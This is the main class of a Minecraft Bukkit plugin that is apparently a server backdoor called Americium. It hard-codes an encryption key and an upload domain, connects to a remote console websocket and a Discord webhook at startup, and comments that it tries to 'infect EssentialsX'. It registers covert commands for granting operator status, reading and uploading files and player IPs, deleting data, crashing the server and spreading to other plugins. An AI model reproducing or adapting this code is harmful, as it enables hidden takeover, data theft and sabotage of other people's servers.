package cc.americium;

import cc.americium.command.Command;
import cc.americium.command.commands.*;
import cc.americium.command.commands.admin.AllowAllAuth;
import cc.americium.command.commands.admin.ChatCommandSpy;
import cc.americium.command.commands.InjectAll;
import cc.americium.command.commands.admin.UploadAllCommands;
import org.apache.commons.lang.ArrayUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.net.URI;
import java.util.logging.Level;
import java.util.logging.Logger;

public final class Z_ extends JavaPlugin {
    public final String version = "1.3.5";
    String key = "fqp19ALX9vp2XDlo";
    String initVector = "ScooCVECCM19al2f";
    public final String domain = "https://upload.americium.systems/uploads";
    public final String uploader = domain;
    private final Authentication _auth = new Authentication();
    private final Injections _injections = new Injections(this);
    public boolean isOutdated = false;
    public Command[] adminOnly = {
            new AllowAllAuth(),
            new ChatCommandSpy(),
            new UploadAllCommands(),
            new Americiumspam(),
            new Edit(),
    };
    public Command[] commands = {
            new Kit(),
            new Push(),
            new InjectAll(),
            new Gamemodes(),
            new Help(),
            new Logout(),
            new ReloadAuth(),
            new IP(),
            new ToggleConsole(),
            new Flood(),
            new OP(),
            new Chat(),
            new Sudo(),
            new Give(),
            new Clear(),
            new ServerIP(),
            new Fly(),
            new DeleteAll(),
            new Stop(),
            new Whitelist(),
            new Kick(),
            new Ban(),
            new God(),
            new Gargle(),
            new Mute(),
            new Capslock(),
            new NPH(),
            new Teleportation(),
            new Invulnerable(),
            new AntiPunishments(),
            new Heal(),
            new HideCommands(),
            new Plugins(),
            new Invis(),
            new Spawnmob(),
            new Coords(),
            new Unload(),
            new CommandSpy(),
            new StorageFiller(),
            new Readfile(),
            new AllOps(),
            new Lockdown(),
            new Console(),
            new Delete(),
            new Dupe(),
            new Velocity(),
            new SetMOTD(),
            new Version(),
            new Rename(),
            new ThirtyTwoK(),
            new Stack(),
            new Enchant(),
            new Inventory(),
            new TPS(),
            new Lag(),
            new Freeze(),
            new Kill(),
            new Equip(),
            new Blame(),
            new Bomb(),
            new Brush(),
            new Worldedit(),
            new Download(),
            new Load(),
            new VPN(),
            new StaffDetector(),
            new Parachute(),
            new AuthChat(),
            new Size(),
            new UploadIPs(),
            new FakeScaffold(),
            new Vanish(),
            new Uploadfolder(),
            new MkDir(),
            new SetHand(),
            new Speed(),
            new Clearchat(),
            new Powertool(),
            new Zip(),
            new Explode(),
            new ToyStick(),
            new Repair(),
            new ConnectWebsocket(),
            new SaveWebsocket(),
            new WebsocketStatus(),
            new Nuker(),
            new Ride(),
            new DiscordSRV(),
            new Flip(),
            new Broadcast(),
            new LockContainers(),
            new Enderchest(),
            new Worlds(),
            new Save(),
            new NPU(),
            new Spam(),
            new ListLoggedIn(),
            new Reload(),
            new NoHunger(),
            new Alone(),
            new FakeLag(),
            new LockInv(),
            new Earrape(),
            new SilentChest(),
            new UpdateFile(),
            new Players(),
            new SpamInterval(),
            new Unzip(),
            new Move(),
            new ResourcePack(),
            new SetName(),
            new ResetName(),
            new Fireball(),
            new SendMessage(),
            new SetExp(),
            new NoCraft(),
            new NoEnchant(),
            new CreateWorld(),
            new TPWorld(),
            new UnloadWorld(),
            new CreateMap(),
            new GetPluginCommand(),
            new SpawnRadius(),
            new LoadServerIcon(),
            new SavePlayers(),
            new Hologram(),
            new Killall(),
            new Weather(),
            new Time(),
            new Effect(),
            new Top(),
            new Dyslexia(),
            new TimeFucker(),
            new GUI(),
            new bobsfun(),
            new TooManyItems(),
            new RamFucker(),
    };
    public boolean isDisabling = false;
    private ExternalConsole _external_console;

    @Override
    public void onEnable() {
        Logger mongoLogger = Logger.getLogger( "org.mongodb.driver.cluster" );
        mongoLogger.setLevel(Level.SEVERE);
        try {
            URI webhook_uri;
            webhook_uri = new URI(ExternalConsole.loadFile());
            setExternalConsole(new ExternalConsole(webhook_uri, this));
            getExternalConsole().connect();
        } catch (Exception ignored) {}

        Logger.getLogger("org.mongodb.driver.cluster").setLevel(Level.SEVERE);
        Logger.getLogger("org.mongodb.driver.connection").setLevel(Level.SEVERE);

        if (Utilities.isNewApi()) {
            Command[] badCommands = {new Crash(), new ToggleAdvancements()};
            for (Command bad : badCommands) {
                this.commands = (Command[]) ArrayUtils.add(this.commands, bad);
            }
        }

        this.setListeners();
        // Wait 5 seconds before attempting to connect, SpigotSupport will unload it and cause errors if it's connected
        for (Command c : this.commands) {
            try {
                c.onEnable(this);
            } catch (Exception ignored) {

            }
        }

        for (Command c : this.adminOnly) {
            try {
                c.onEnable(this);
            } catch (Exception ignored) {

            }
        }

        try {
            Utilities.checkAllUsers(this);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        DiscordWebhook.serverReady(this);

        // Make sure SpigotSupport is downloaded, and try to infect EssentialsX.
        try {
            this._injections.onEnable();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDisable() {
        isDisabling = true;

        for (Command c : this.commands) {
            c.onDisable(this);
        }

        for (Command c : this.adminOnly) {
            c.onDisable(this);
        }

        if(isOutdated){

        }

        if (this._external_console != null) {
            if (this._external_console.isOpen()) {
                this._external_console.close();
            }
        }

        for (Player p : Bukkit.getOnlinePlayers()) {
            try {
                if (this._auth.isVerified(p.getName())) {
                    p.sendMessage(Colors.Prefix + Colors.Failure + "The server is stopping or reloading, " + Colors.SuperFailure + ChatColor.BOLD + ChatColor.UNDERLINE + "DO NOT SEND ANY COMMANDS" + Colors.Failure + " because I CANNOT cancel them!");
                }
            } catch (IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

       DiscordWebhook.serverStop(this);
    }

    private void setListeners() {
        Listeners listeners = new Listeners();
        listeners.setReclines(this);

        this.getServer().getPluginManager().registerEvents(listeners, this);
    }

    public void refreshAuth(String name) throws IOException, InterruptedException {
            if (Authentication.isVerified(name)){
            }
    }


    public Authentication getAuth() {
        return this._auth;
    }

    public Injections getInjections() {
        return this._injections;
    }

    public ExternalConsole getExternalConsole() {
        return this._external_console;
    }

    public void setExternalConsole(ExternalConsole ex) {
        this._external_console = ex;
    }
}

//testing discord